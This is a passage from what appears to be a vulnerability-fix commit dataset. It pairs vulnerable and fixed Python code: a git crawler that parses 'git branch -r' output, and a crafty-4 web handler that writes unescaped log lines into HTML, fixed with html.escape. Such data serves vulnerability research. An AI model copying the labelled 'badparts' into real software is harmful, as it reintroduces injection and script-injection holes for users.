configs import AuthorInfoConfig\nfrom helpers.path_helpers import REPO_PATH\nfrom queries.sub_queries.file_operation_queries import FileOperationQueries\nfrom queries.sub_queries.general_info_queries import GeneralInfoQueries\nfrom queries.sub_queries.repo_overview_queries import RepoOverviewQueries\n\n\nclass AuthorInfoProvider:\n    UNKNOWN_PERSON_INFO = {\n        'team_id': 'UNKNOWN',\n        'person_image_url': '',\n        'person_description': '',\n        'person_contact_link': ''\n    }\n    AUTHOR_COLUMN_NAME = db.SqlCommitMetadata.author.name\n\n    def __init__(self, author_info: AuthorInfoConfig):\n        self._author_info = author_info\n\n    def add_info_to_author_names(self, names: Iterable[str]) -> pd.DataFrame:\n        additional_data = []\n        for name in set(names):\n            person_info = self._author_info.authors.get(name, self.UNKNOWN_PERSON_INFO)\n            team_id = person_info['team_id']\n            if team_id not in self._author_info.teams:\n                raise ValueError(f'Person \"{name}\" has a team ID of \"{team_id}\" that does not exist.')\n\n            info = {self.AUTHOR_COLUMN_NAME: name}\n            info.update(person_info)\n            info.update(self._author_info.teams[team_id])\n            additional_data.append(info)\n        return pd.DataFrame(additional_data)\n\n    def get_all_teams_data(self) -> pd.DataFrame:\n        info = pd.DataFrame(self._author_info.teams).transpose()\n        info['team_name'] = info.index\n        info.reset_index(inplace=True, drop=True)\n        return info\n\n\nclass BranchInfoProvider:\n    def __init__(self):\n        pass\n\n    def filter_for_commits_in_branch(self, data: pd.DataFrame, branch: str):\n        \"\"\" Discards commits that do not belong to the given branch. We could do this in SQL, however:\n          - Option 1: Save all branches and their commits into the data base -> with multiple branches the data base\n                      quickly gets big fast + writing 100k+ entries for each branch takes a long time\n          - Option 2: Provide commit hashes in SQL query -> this is super slow when filtering for 100k+ hashes\n        Therefore its much more performant to do commit filtering locally\"\"\"\n\n        hashes_in_branch = self._get_hashes_in_branch(branch)\n        return data.loc[data.hash.isin(hashes_in_branch)]\n\n    @cache(limit=10)\n    def _get_hashes_in_branch(self, branch: str) -> List[str]:\n        repo = git.Repo(REPO_PATH)\n        return repo.git.execute(f'git log \"origin\/{branch}\" --pretty=format:%H').splitlines()\n\n\nclass Queries:\n    def __init__(self):\n        db_session = db.get_session()\n        author_info_provider = AuthorInfoProvider(AuthorInfoConfig.load())\n        branch_info_provider = BranchInfoProvider()\n\n        self.general_info = GeneralInfoQueries(db_session)\n        self.file_operations = FileOperationQueries(db_session, branch_info_provider, author_info_provider)\n        self.overview = RepoOverviewQueries(db_session, branch_info_provider, author_info_provider)\n\n\nif __name__ == '__main__':\n    q = Queries()\n    # print(q.general_info.get_all_authors())\n    # print(q.general_info.get_all_branches())\n    # print(q.general_info.get_all_paths_in_branch('master'))\n    print(q.file_operations.get_history_of_path('Python\/', 'master'))\n    # print(q.overview.calculate_count_and_best_team_of_dir('master'))\n    print(q.overview.calculate_loc_vs_edit_counts('master'))\n"},"\/backend\/repo_management\/git_crawler.py":{"changes":[{"diff":"\n         return commit_hash_of_branch\n \n     def __get_repo_branches(self):\n-        branches_raw = self._repo.git.execute('git branch -r')\n-        branches = [branch.strip() for branch in branches_raw.splitlines() if ' -> ' not in branch]\n-        return branches\n+        return [ref.name for ref in self._repo.remotes[0].refs]\n \n     def __clean_origin_branch_name(self, branch_name):\n         # We use the branches available from the origin remote repo, but want to present them\n","add":1,"remove":3,"filename":"\/backend\/repo_management\/git_crawler.py","badparts":["        branches_raw = self._repo.git.execute('git branch -r')","        branches = [branch.strip() for branch in branches_raw.splitlines() if ' -> ' not in branch]","        return branches"],"goodparts":["        return [ref.name for ref in self._repo.remotes[0].refs]"]},{"diff":"\n         return commit_hash_of_branch\n \n     def __get_repo_branches(self):\n-        branches_raw = self._repo.git.execute('git branch -r')\n-        branches = [branch.strip() for branch in branches_raw.splitlines() if ' -> ' not in branch]\n-        return branches\n+        return [ref.name for ref in self._repo.remotes[0].refs]\n \n     def __clean_origin_branch_name(self, branch_name):\n         # We use the branches available from the origin remote repo, but want to present them\n","add":1,"remove":3,"filename":"\/backend\/repo_management\/git_crawler.py","badparts":["        branches_raw = self._repo.git.execute('git branch -r')","        branches = [branch.strip() for branch in branches_raw.splitlines() if ' -> ' not in branch]","        return branches"],"goodparts":["        return [ref.name for ref in self._repo.remotes[0].refs]"]}],"source":"\nimport pprint import re import time from collections import defaultdict, namedtuple from copy import copy from pathlib import Path from typing import Dict, List from uuid import uuid4 import git from bidict import bidict from sqlalchemy.exc import OperationalError import db_schema as db from helpers.path_helpers import REPO_PATH from repo_management.git_crawl_items import Commit class CurrentFilesInfoCollector: \"\"\"Calculates and tracks the line count of all files in the given branches.\"\"\" MAGIC_EMPTY_HASH='4b825dc642cb6eb9a060e54bf8d69288fbee4904' EXTRACT_NUMBER_AT_START_REGEX=re.compile(r'^(\\d+)') EntryInfo=namedtuple('EntryInfo',['id', 'path', 'line_count']) def __init__(self, repo: git.Repo): self._repo=repo self._file_infos_of_branch={} def add_branch_info(self, branch, branch_head_hash, current_paths_of_branch): line_counts_of_files=self._parse_current_line_counts(branch_head_hash) file_infos=[] for file_id, file_path in current_paths_of_branch.items(): file_info=self.EntryInfo(file_id, file_path, line_counts_of_files.get(file_path, None)) file_infos.append(file_info) self._file_infos_of_branch[branch]=file_infos def _parse_current_line_counts(self, commit_hash): raw_text=self._repo.git.execute(f'git diff --stat{self.MAGIC_EMPTY_HASH}{commit_hash}') line_counts_of_files={} for raw_line in raw_text.splitlines(): file_path, line_count=self._parse_single_git_line_count_line(raw_line) if file_path is not None: line_counts_of_files[file_path]=line_count return line_counts_of_files def _parse_single_git_line_count_line(self, line: str): parts=line.split('|') if len(parts) !=2: return None, None file_path=parts[0].strip() line_count_match=re.findall(self.EXTRACT_NUMBER_AT_START_REGEX, parts[1].strip()) if not line_count_match: return None, None return file_path, int(line_count_match[0]) def add_to_db(self, db_session): for branch, file_infos in self._file_infos_of_branch.items(): for file_info in file_infos: sql_entry=db.SqlCurrentFileInfo( branch=branch, file_id=file_info.id, current_path=file_info.path, line_count=file_info.line_count ) db_session.add(sql_entry) def __repr__(self): return pprint.pformat(self._file_infos_of_branch) class CommitProvider: \"\"\" Caches existing commit info objects from the database. If a requested commit info is not found, it creates a new one from the given data.\"\"\" def __init__(self): db_session=db.get_session() try: self._available_commits=self.__fetch_all_commits_from_db(db_session) except OperationalError: self._available_commits={} finally: db_session.close() def __fetch_all_commits_from_db(self, db_session): db_metadata=db_session.query(db.SqlCommitMetadata).all() db_affected_files=db_session.query(db.SqlAffectedFile).all() affected_files_of_commit=defaultdict(list) for db_af in db_affected_files: affected_files_of_commit[db_af.hash].append(db_af) return{db_md.hash: Commit.from_db(db_md, affected_files_of_commit[db_md.hash]) for db_md in db_metadata} def get_commit(self, git_commit: git.Commit) -> Commit: if git_commit.hexsha not in self._available_commits: self._available_commits[git_commit.hexsha]=Commit.from_git_commit(git_commit) return self._available_commits[git_commit.hexsha] def get_cached_commit(self, commit_hash) -> Commit: return self._available_commits.get(commit_hash, None) class CommitCrawlerState: IDLE='IDLE' CLONE_REPO='CLONE_REPO' UPDATE_REPO='UPDATE_REPO' GET_PREVIOUS_COMMITS='GET_PREVIOUS_COMMITS' EXTRACT_COMMITS='EXTRACT_COMMITS' CALCULATE_PATHS='CALCULATE_PATHS' SAVE_TO_DB='SAVE_TO_DB' class CommitCrawler: def __init__(self, repo_path: Path): self._repo_path=Path(repo_path) self._repo=None self._commit_provider=None self._child_commit_graph=None self._latest_hashes=None self._commits_processed=0 self._commits_total=0 self._current_operation=CommitCrawlerState.IDLE self._error_message='' def is_checked_out(self): return Path(self._repo_path, '.git').exists() def checkout(self, repo_url): git.Repo.clone_from(repo_url, self._repo_path, no_checkout=True) def get_crawl_status(self): return{ 'commits_processed': self._commits_processed, 'commits_total': self._commits_total, 'current_operation': self._current_operation, 'error_message': self._error_message, } def is_busy(self): return self._current_operation !=CommitCrawlerState.IDLE def crawl(self, update_before_crawl=True, limit_tracked_branches_days_last_activity=None): if self.is_busy(): return self._error_message='' try: self.__crawl(update_before_crawl, limit_tracked_branches_days_last_activity) except Exception as e: self._error_message=str(e) self._current_operation=CommitCrawlerState.IDLE def __crawl(self, update_before_crawl, limit_tracked_branches_days_last_activity): if not self.is_checked_out(): raise FileNotFoundError('The repository has not been checked out yet.') self._repo=git.Repo(self._repo_path) if update_before_crawl: self._current_operation=CommitCrawlerState.UPDATE_REPO self._repo.remotes[0].fetch() self._current_operation=CommitCrawlerState.GET_PREVIOUS_COMMITS self._commit_provider=CommitProvider() self._current_operation=CommitCrawlerState.EXTRACT_COMMITS all_hashes=self._repo.git.execute('git rev-list --all').splitlines() self._child_commit_graph=self.__extract_child_tree(all_hashes) self._current_operation=CommitCrawlerState.CALCULATE_PATHS self._latest_hashes=self.__get_latest_commits_of_branches(limit_tracked_branches_days_last_activity) current_paths_of_branches=self.__follow_files() self._current_operation=CommitCrawlerState.SAVE_TO_DB CrawlResult(self._child_commit_graph, current_paths_of_branches).write_to_db() self._current_operation=CommitCrawlerState.IDLE def __get_latest_commits_of_branches(self, limit_tracked_branches_days_last_activity): minTimestamp=(time.time() -(limit_tracked_branches_days_last_activity * 24 * 3600) if limit_tracked_branches_days_last_activity else 0) commit_hash_of_branch={} for branch in self.__get_repo_branches(): commit_hash=self._repo.git.execute(f'git rev-parse \"{branch}\"').strip() commit_metadata=self._commit_provider.get_cached_commit(commit_hash).metadata if commit_metadata.authored_timestamp >=minTimestamp: commit_hash_of_branch[commit_hash]=self.__clean_origin_branch_name(branch) return commit_hash_of_branch def __get_repo_branches(self): branches_raw=self._repo.git.execute('git branch -r') branches=[branch.strip() for branch in branches_raw.splitlines() if ' -> ' not in branch] return branches def __clean_origin_branch_name(self, branch_name): return branch_name.split('\/')[-1] def __extract_child_tree(self, all_hashes): self._commits_total=len(all_hashes) children=defaultdict(list) for i, hash in enumerate(all_hashes): commit=self._repo.commit(hash) for parent in commit.parents[:1]: children[parent.hexsha].append(self.__create_child_commit_entry(commit)) self._commits_processed=i +1 initial_hash=all_hashes[-1] initial_commit=self._repo.commit(initial_hash) children['empty'].append(self.__create_child_commit_entry(initial_commit)) return children def __create_child_commit_entry(self, commit): return self._commit_provider.get_commit(commit) def __follow_files(self): current_paths_of_branches=CurrentFilesInfoCollector(self._repo) self.__follow_file_renames_from_commit('empty', current_paths_of_branches, bidict()) return current_paths_of_branches def __follow_file_renames_from_commit(self, commit_hash, files_info_collector: CurrentFilesInfoCollector, branch_file_paths: bidict): current_commit_hash=commit_hash while True: if current_commit_hash not in self._child_commit_graph: return number_child_commits=len(self._child_commit_graph[current_commit_hash]) if number_child_commits==0: return if number_child_commits==1: current_commit_hash=self.__process_child_commmit(self._child_commit_graph[current_commit_hash][0], files_info_collector, branch_file_paths) else: for child_commit in self._child_commit_graph[current_commit_hash]: sub_branch_file_paths=copy(branch_file_paths) child_commit_hash=self.__process_child_commmit(child_commit, files_info_collector, sub_branch_file_paths) self.__follow_file_renames_from_commit(child_commit_hash, files_info_collector, sub_branch_file_paths) return def __process_child_commmit(self, child_commit: Commit, files_info_collector: CurrentFilesInfoCollector, branch_file_paths: bidict): for affected_file in child_commit.affected_files: change_type=affected_file.change_type if change_type=='A': file_id=affected_file.file_id or str(uuid4()) else: file_id=branch_file_paths.inverse[affected_file.old_path] affected_file.file_id=file_id branch_file_paths[file_id]=affected_file.new_path if change_type=='D': del branch_file_paths[file_id] child_commit_hash=child_commit.hash if child_commit_hash in self._latest_hashes: branch_name=self._latest_hashes[child_commit_hash] files_info_collector.add_branch_info(branch_name, child_commit_hash, dict(branch_file_paths)) return child_commit_hash class CrawlResult: def __init__(self, child_commit_tree: Dict[str, List[Commit]], current_paths_of_branches: CurrentFilesInfoCollector): self.child_commit_tree=child_commit_tree self.current_info_of_branches=current_paths_of_branches def write_to_db(self): db_engine=db.get_engine() db.create_tables() db.SqlCurrentFileInfo.__table__.drop(db_engine) db.create_tables() db_session=db.get_session() for commits in self.child_commit_tree.values(): for commit in commits: commit.add_to_db(db_session) self.current_info_of_branches.add_to_db(db_session) db_session.commit() if __name__=='__main__': crawler=CommitCrawler(REPO_PATH) crawler.crawl() print('Finished!') ","sourceWithComments":"import pprint\nimport re\nimport time\nfrom collections import defaultdict, namedtuple\nfrom copy import copy\nfrom pathlib import Path\nfrom typing import Dict, List\nfrom uuid import uuid4\n\nimport git\nfrom bidict import bidict\nfrom sqlalchemy.exc import OperationalError\n\nimport db_schema as db\nfrom helpers.path_helpers import REPO_PATH\nfrom repo_management.git_crawl_items import Commit\n\n\nclass CurrentFilesInfoCollector:\n    \"\"\"Calculates and tracks the line count of all files in the given branches.\"\"\"\n\n    MAGIC_EMPTY_HASH = '4b825dc642cb6eb9a060e54bf8d69288fbee4904'  # See https:\/\/stackoverflow.com\/a\/40884093\n    EXTRACT_NUMBER_AT_START_REGEX = re.compile(r'^(\\d+)')\n    EntryInfo = namedtuple('EntryInfo', ['id', 'path', 'line_count'])\n\n    def __init__(self, repo: git.Repo):\n        self._repo = repo\n        self._file_infos_of_branch = {}\n\n    def add_branch_info(self, branch, branch_head_hash, current_paths_of_branch):\n        line_counts_of_files = self._parse_current_line_counts(branch_head_hash)\n        file_infos = []\n        for file_id, file_path in current_paths_of_branch.items():\n            file_info = self.EntryInfo(file_id, file_path, line_counts_of_files.get(file_path, None))\n            file_infos.append(file_info)\n\n        self._file_infos_of_branch[branch] = file_infos\n\n    def _parse_current_line_counts(self, commit_hash):\n        raw_text = self._repo.git.execute(f'git diff --stat {self.MAGIC_EMPTY_HASH} {commit_hash}')\n        line_counts_of_files = {}\n        for raw_line in raw_text.splitlines():\n            file_path, line_count = self._parse_single_git_line_count_line(raw_line)\n            if file_path is not None:\n                line_counts_of_files[file_path] = line_count\n        return line_counts_of_files\n\n    def _parse_single_git_line_count_line(self, line: str):\n        # Schema:  myDir\/subDir\/myFile.txt         |    39 +\n        parts = line.split('|')\n        if len(parts) != 2:\n            return None, None\n        file_path = parts[0].strip()\n        line_count_match = re.findall(self.EXTRACT_NUMBER_AT_START_REGEX, parts[1].strip())\n        if not line_count_match:  # At binary entries like: picture.jpg    | Bin 0 -> 27063 bytes\n            return None, None\n        return file_path, int(line_count_match[0])\n\n    def add_to_db(self, db_session):\n        for branch, file_infos in self._file_infos_of_branch.items():\n            for file_info in file_infos:\n                sql_entry = db.SqlCurrentFileInfo(\n                    branch=branch,\n                    file_id=file_info.id,\n                    current_path=file_info.path,\n                    line_count=file_info.line_count\n                )\n                db_session.add(sql_entry)\n\n    def __repr__(self):\n        return pprint.pformat(self._file_infos_of_branch)\n\n\nclass CommitProvider:\n    \"\"\" Caches existing commit info objects from the database. If a requested commit info is not found,\n     it creates a new one from the given data.\"\"\"\n    def __init__(self):\n        db_session = db.get_session()\n        try:\n            self._available_commits = self.__fetch_all_commits_from_db(db_session)\n        except OperationalError:  # No database was initialized yet\n            self._available_commits = {}\n        finally:\n            db_session.close()\n\n    def __fetch_all_commits_from_db(self, db_session):\n        db_metadata = db_session.query(db.SqlCommitMetadata).all()\n        db_affected_files = db_session.query(db.SqlAffectedFile).all()\n        affected_files_of_commit = defaultdict(list)\n        for db_af in db_affected_files:\n            affected_files_of_commit[db_af.hash].append(db_af)\n\n        return {db_md.hash: Commit.from_db(db_md, affected_files_of_commit[db_md.hash]) for db_md in db_metadata}\n\n    def get_commit(self, git_commit: git.Commit) -> Commit:\n        # This will always return a commit\n        if git_commit.hexsha not in self._available_commits:\n            self._available_commits[git_commit.hexsha] = Commit.from_git_commit(git_commit)\n        return self._available_commits[git_commit.hexsha]\n\n    def get_cached_commit(self, commit_hash) -> Commit:\n        # This will only return a commit if it was already processed here.\n        return self._available_commits.get(commit_hash, None)\n\n\nclass CommitCrawlerState:\n    IDLE = 'IDLE'\n    CLONE_REPO = 'CLONE_REPO'\n    UPDATE_REPO = 'UPDATE_REPO'\n    GET_PREVIOUS_COMMITS = 'GET_PREVIOUS_COMMITS'\n    EXTRACT_COMMITS = 'EXTRACT_COMMITS'\n    CALCULATE_PATHS = 'CALCULATE_PATHS'\n    SAVE_TO_DB = 'SAVE_TO_DB'\n\n\nclass CommitCrawler:\n\n    def __init__(self, repo_path: Path):\n        self._repo_path = Path(repo_path)\n\n        self._repo = None\n        self._commit_provider = None\n\n        self._child_commit_graph = None\n        self._latest_hashes = None\n\n        self._commits_processed = 0\n        self._commits_total = 0\n        self._current_operation = CommitCrawlerState.IDLE\n        self._error_message = ''\n\n    def is_checked_out(self):\n        return Path(self._repo_path, '.git').exists()\n\n    def checkout(self, repo_url):\n        git.Repo.clone_from(repo_url, self._repo_path, no_checkout=True)\n\n    def get_crawl_status(self):\n        return {\n            'commits_processed': self._commits_processed,\n            'commits_total': self._commits_total,\n            'current_operation': self._current_operation,\n            'error_message': self._error_message,\n        }\n\n    def is_busy(self):\n        return self._current_operation != CommitCrawlerState.IDLE\n\n    def crawl(self, update_before_crawl=True, limit_tracked_branches_days_last_activity=None):\n        if self.is_busy():\n            return\n\n        self._error_message = ''\n        try:\n            self.__crawl(update_before_crawl, limit_tracked_branches_days_last_activity)\n        except Exception as e:\n            self._error_message = str(e)\n            self._current_operation = CommitCrawlerState.IDLE\n\n    def __crawl(self, update_before_crawl, limit_tracked_branches_days_last_activity):\n        if not self.is_checked_out():\n            raise FileNotFoundError('The repository has not been checked out yet.')\n\n        self._repo = git.Repo(self._repo_path)\n        if update_before_crawl:\n            self._current_operation = CommitCrawlerState.UPDATE_REPO\n            self._repo.remotes[0].fetch()\n\n        self._current_operation = CommitCrawlerState.GET_PREVIOUS_COMMITS\n        self._commit_provider = CommitProvider()\n\n        self._current_operation = CommitCrawlerState.EXTRACT_COMMITS\n        all_hashes = self._repo.git.execute('git rev-list --all').splitlines()\n        self._child_commit_graph = self.__extract_child_tree(all_hashes)\n\n        self._current_operation = CommitCrawlerState.CALCULATE_PATHS\n        self._latest_hashes = self.__get_latest_commits_of_branches(limit_tracked_branches_days_last_activity)\n        current_paths_of_branches = self.__follow_files()\n\n        self._current_operation = CommitCrawlerState.SAVE_TO_DB\n        CrawlResult(self._child_commit_graph, current_paths_of_branches).write_to_db()\n\n        self._current_operation = CommitCrawlerState.IDLE\n\n    def __get_latest_commits_of_branches(self, limit_tracked_branches_days_last_activity):\n        minTimestamp = (time.time() - (limit_tracked_branches_days_last_activity * 24 * 3600)\n                        if limit_tracked_branches_days_last_activity else 0)\n        commit_hash_of_branch = {}\n        for branch in self.__get_repo_branches():\n            commit_hash = self._repo.git.execute(f'git rev-parse \"{branch}\"').strip()\n            commit_metadata = self._commit_provider.get_cached_commit(commit_hash).metadata\n            if commit_metadata.authored_timestamp >= minTimestamp:\n                commit_hash_of_branch[commit_hash] = self.__clean_origin_branch_name(branch)\n        return commit_hash_of_branch\n\n    def __get_repo_branches(self):\n        branches_raw = self._repo.git.execute('git branch -r')\n        branches = [branch.strip() for branch in branches_raw.splitlines() if ' -> ' not in branch]\n        return branches\n\n    def __clean_origin_branch_name(self, branch_name):\n        # We use the branches available from the origin remote repo, but want to present them\n        # as \"master\" instead of \"origin\/master\"\n        return branch_name.split('\/')[-1]\n\n    def __extract_child_tree(self, all_hashes):\n        self._commits_total = len(all_hashes)\n\n        children = defaultdict(list)\n        for i, hash in enumerate(all_hashes):\n            commit = self._repo.commit(hash)\n            # When merging there is only a commit in the target branch, not the others that got merged in\n            for parent in commit.parents[:1]:\n                children[parent.hexsha].append(self.__create_child_commit_entry(commit))\n\n            self._commits_processed = i + 1\n\n        initial_hash = all_hashes[-1]\n        initial_commit = self._repo.commit(initial_hash)\n        children['empty'].append(self.__create_child_commit_entry(initial_commit))\n        return children\n\n    def __create_child_commit_entry(self, commit):\n        return self._commit_provider.get_commit(commit)\n\n    def __follow_files(self):\n        current_paths_of_branches = CurrentFilesInfoCollector(self._repo)\n        self.__follow_file_renames_from_commit('empty', current_paths_of_branches, bidict())\n        return current_paths_of_branches\n\n    def __follow_file_renames_from_commit(self, commit_hash, files_info_collector: CurrentFilesInfoCollector,\n                                          branch_file_paths: bidict):\n        current_commit_hash = commit_hash\n        while True:\n            if current_commit_hash not in self._child_commit_graph:\n                return\n            number_child_commits = len(self._child_commit_graph[current_commit_hash])\n            if number_child_commits == 0:\n                return\n            if number_child_commits == 1:\n                current_commit_hash = self.__process_child_commmit(self._child_commit_graph[current_commit_hash][0],\n                                                                   files_info_collector, branch_file_paths)\n            else:\n                for child_commit in self._child_commit_graph[current_commit_hash]:\n                    sub_branch_file_paths = copy(branch_file_paths)\n                    child_commit_hash = self.__process_child_commmit(child_commit, files_info_collector,\n                                                                     sub_branch_file_paths)\n                    self.__follow_file_renames_from_commit(child_commit_hash, files_info_collector,\n                                                           sub_branch_file_paths)  # Only use recursion at commit graph branches\n                return\n\n    def __process_child_commmit(self, child_commit: Commit, files_info_collector: CurrentFilesInfoCollector,\n                                branch_file_paths: bidict):\n        for affected_file in child_commit.affected_files:\n            change_type = affected_file.change_type\n            if change_type == 'A':\n                file_id = affected_file.file_id or str(uuid4())\n            else:\n                file_id = branch_file_paths.inverse[affected_file.old_path]\n\n            affected_file.file_id = file_id\n            branch_file_paths[file_id] = affected_file.new_path\n            if change_type == 'D':\n                del branch_file_paths[file_id]\n        child_commit_hash = child_commit.hash\n        if child_commit_hash in self._latest_hashes:\n            branch_name = self._latest_hashes[child_commit_hash]\n            files_info_collector.add_branch_info(branch_name, child_commit_hash, dict(branch_file_paths))\n        return child_commit_hash\n\n\nclass CrawlResult:\n    def __init__(self, child_commit_tree: Dict[str, List[Commit]], current_paths_of_branches: CurrentFilesInfoCollector):\n        self.child_commit_tree = child_commit_tree\n        self.current_info_of_branches = current_paths_of_branches\n\n    def write_to_db(self):\n        db_engine = db.get_engine()\n\n        db.create_tables()\n        db.SqlCurrentFileInfo.__table__.drop(db_engine)\n        db.create_tables()\n\n        db_session = db.get_session()\n        for commits in self.child_commit_tree.values():\n            for commit in commits:\n                commit.add_to_db(db_session)\n\n        self.current_info_of_branches.add_to_db(db_session)\n\n        db_session.commit()\n\n\nif __name__ == '__main__':\n    crawler = CommitCrawler(REPO_PATH)\n    crawler.crawl()\n    print('Finished!')\n"}},"msg":"Fix potential remote code execution vulnerability"}},"https:\/\/github.com\/exzork\/crafty-4":{"a79f42f4da049db99251db76ce4897446fc1542e":{"url":"https:\/\/api.github.com\/repos\/exzork\/crafty-4\/commits\/a79f42f4da049db99251db76ce4897446fc1542e","html_url":"https:\/\/github.com\/exzork\/crafty-4\/commit\/a79f42f4da049db99251db76ce4897446fc1542e","message":"Escape logfile output, fixes weird formatting and remote code execution vulnerability","sha":"a79f42f4da049db99251db76ce4897446fc1542e","keyword":"remote code execution vulnerable","diff":"diff --git a\/app\/classes\/web\/ajax_handler.py b\/app\/classes\/web\/ajax_handler.py\nindex 0796527e..0f0cdb4c 100644\n--- a\/app\/classes\/web\/ajax_handler.py\n+++ b\/app\/classes\/web\/ajax_handler.py\n@@ -5,6 +5,7 @@\n import bleach\n import os\n import shutil\n+import html\n \n from app.classes.shared.console import console\n from app.classes.shared.models import Users, installer\n@@ -68,7 +69,7 @@ def get(self, page):\n \n             for d in data:\n                 try:\n-                    line = helper.log_colors(d)\n+                    line = helper.log_colors(html.escape(d))\n                     self.write('{}<br \/>'.format(line))\n                     # self.write(d.encode(\"utf-8\"))\n \n","files":{"\/app\/classes\/web\/ajax_handler.py":{"changes":[{"diff":"\n \n             for d in data:\n                 try:\n-                    line = helper.log_colors(d)\n+                    line = helper.log_colors(html.escape(d))\n                     self.write('{}<br \/>'.format(line))\n                     # self.write(d.encode(\"utf-8\"))\n \n","add":1,"remove":1,"filename":"\/app\/classes\/web\/ajax_handler.py","badparts":["                    line = helper.log_colors(d)"],"goodparts":["                    line = helper.log_colors(html.escape(d))"]},{"diff":"\n \n             for d in data:\n                 try:\n-                    line = helper.log_colors(d)\n+                    line = helper.log_colors(html.escape(d))\n                     self.write('{}<br \/>'.format(line))\n                     # self.write(d.encode(\"utf-8\"))\n \n","add":1,"remove":1,"filename":"\/app\/classes\/web\/ajax_handler.py","badparts":["                    line = helper.log_colors(d)"],"goodparts":["                    line = helper.log_colors(html.escape(d))"]}],"source":"\nimport json import logging import tornado.web import tornado.escape import bleach import os import shutil from app.classes.shared.console import console from app.classes.shared.models import Users, installer from app.classes.web.base_handler import BaseHandler from app.classes.shared.models import db_helper from app.classes.shared.helpers import helper logger=logging.getLogger(__name__) class AjaxHandler(BaseHandler): def render_page(self, template, page_data): self.render( template, data=page_data, translate=self.translator.translate, ) @tornado.web.authenticated def get(self, page): user_data=json.loads(self.get_secure_cookie(\"user_data\")) error=bleach.clean(self.get_argument('error', \"WTF Error!\")) template=\"panel\/denied.html\" page_data={ 'user_data': user_data, 'error': error } if page==\"error\": template=\"public\/error.html\" self.render_page(template, page_data) elif page=='server_log': server_id=self.get_argument('id', None) full_log=self.get_argument('full', False) if server_id is None: logger.warning(\"Server ID not found in server_log ajax call\") self.redirect(\"\/panel\/error?error=Server ID Not Found\") return False server_id=bleach.clean(server_id) server_data=db_helper.get_server_data_by_id(server_id) if not server_data: logger.warning(\"Server Data not found in server_log ajax call\") self.redirect(\"\/panel\/error?error=Server ID Not Found\") if not server_data['log_path']: logger.warning(\"Log path not found in server_log ajax call({})\".format(server_id)) if full_log: log_lines=helper.get_setting('max_log_lines') else: log_lines=helper.get_setting('virtual_terminal_lines') data=helper.tail_file(server_data['log_path'], log_lines) for d in data: try: line=helper.log_colors(d) self.write('{}<br \/>'.format(line)) except Exception as e: logger.warning(\"Skipping Log Line due to error:{}\".format(e)) pass elif page==\"announcements\": data=helper.get_announcements() page_data['notify_data']=data self.render_page('ajax\/notify.html', page_data) elif page==\"get_file\": file_path=self.get_argument('file_path', None) server_id=self.get_argument('id', None) if not self.check_server_id(server_id, 'get_file'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\ or not helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in get_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in get_file ajax call({})\".format(file_path)) return False error=None try: with open(file_path) as file: file_contents=file.read() except UnicodeDecodeError: file_contents='' error='UnicodeDecodeError' self.write({ 'content': file_contents, 'error': error }) self.finish() elif page==\"get_tree\": server_id=self.get_argument('id', None) if not self.check_server_id(server_id, 'get_tree'): return False else: server_id=bleach.clean(server_id) self.write(db_helper.get_server_data_by_id(server_id)['path'] +'\\n' + helper.generate_tree(db_helper.get_server_data_by_id(server_id)['path'])) self.finish() @tornado.web.authenticated def post(self, page): user_data=json.loads(self.get_secure_cookie(\"user_data\")) error=bleach.clean(self.get_argument('error', \"WTF Error!\")) page_data={ 'user_data': user_data, 'error': error } if page==\"send_command\": command=self.get_body_argument('command', default=None, strip=True) server_id=self.get_argument('id') if server_id is None: logger.warning(\"Server ID not found in send_command ajax call\") console.warning(\"Server ID not found in send_command ajax call\") srv_obj=self.controller.get_server_obj(server_id) if command: if srv_obj.check_running(): srv_obj.send_command(command) elif page==\"create_file\": file_parent=self.get_body_argument('file_parent', default=None, strip=True) file_name=self.get_body_argument('file_name', default=None, strip=True) file_path=os.path.join(file_parent, file_name) server_id=self.get_argument('id', None) print(server_id) if not self.check_server_id(server_id, 'create_file'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path) \\ or helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in create_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in create_file ajax call({})\".format(file_path)) return False with open(file_path, 'w') as file_object: file_object.close() elif page==\"create_dir\": dir_parent=self.get_body_argument('dir_parent', default=None, strip=True) dir_name=self.get_body_argument('dir_name', default=None, strip=True) dir_path=os.path.join(dir_parent, dir_name) server_id=self.get_argument('id', None) print(server_id) if not self.check_server_id(server_id, 'create_dir'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], dir_path) \\ or helper.check_path_exists(os.path.abspath(dir_path)): logger.warning(\"Invalid path in create_dir ajax call({})\".format(dir_path)) console.warning(\"Invalid path in create_dir ajax call({})\".format(dir_path)) return False os.mkdir(dir_path) @tornado.web.authenticated def delete(self, page): if page==\"del_file\": file_path=self.get_body_argument('file_path', default=None, strip=True) server_id=self.get_argument('id', None) console.warning(\"delete{} for server{}\".format(file_path, server_id)) if not self.check_server_id(server_id, 'del_file'): return False else: server_id=bleach.clean(server_id) server_info=db_helper.get_server_data_by_id(server_id) if not(helper.in_path(server_info['path'], file_path) \\ or helper.in_path(server_info['backup_path'], file_path)) \\ or not helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in del_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in del_file ajax call({})\".format(file_path)) return False os.remove(file_path) elif page==\"del_dir\": dir_path=self.get_body_argument('dir_path', default=None, strip=True) server_id=self.get_argument('id', None) print(server_id) console.warning(\"delete{} for server{}\".format(file_path, server_id)) if not self.check_server_id(server_id, 'del_dir'): return False else: server_id=bleach.clean(server_id) server_info=db_helper.get_server_data_by_id(server_id) if not helper.in_path(server_info['path'], dir_path) \\ or not helper.check_path_exists(os.path.abspath(dir_path)): logger.warning(\"Invalid path in del_file ajax call({})\".format(dir_path)) console.warning(\"Invalid path in del_file ajax call({})\".format(dir_path)) return False shutil.rmtree(dir_path) @tornado.web.authenticated def put(self, page): if page==\"save_file\": file_contents=self.get_body_argument('file_contents', default=None, strip=True) file_path=self.get_body_argument('file_path', default=None, strip=True) server_id=self.get_argument('id', None) print(file_contents) print(file_path) print(server_id) if not self.check_server_id(server_id, 'save_file'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\ or not 